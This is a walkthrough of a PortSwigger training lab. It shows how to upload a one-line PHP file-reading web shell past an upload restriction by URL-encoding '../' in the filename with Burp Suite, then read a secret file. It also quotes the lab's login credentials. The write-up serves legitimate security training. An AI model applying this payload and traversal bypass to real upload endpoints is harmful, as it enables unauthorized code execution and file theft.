# Lab-3: [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal). 

**Aim :-** To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``` /home/carlos/secret ```. Submit this secret using the button provided in the lab banner. 

You can log in to your own account using the following credentials: ``` wiener:peter ```.



## Solution
- Login as ``` wiener ```.
    - Username : ``` wiener ```.
    - Password : ``` peter ```.

- There will be a option to upload image.

- Copy the following code and save it in a file, name it as ``` exploit.php ```.
    - ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```.

- Try uploading the ``` exploit.php ``` file.

- The file will be uploaded successfully but if try to open that file the code will be shown in the page instead of executing it.

- Intercept the upload request using **burp suite**.

- **URL** encode ``` ../ ``` and put in front of the file name then send the request ( ``` %2e%2e%2fexploit.php ``` ).

- Open the image in new tab by going to ``` /files/exploit.php ```.

- The server will respond with a secret code, copy the code and submit it as solution.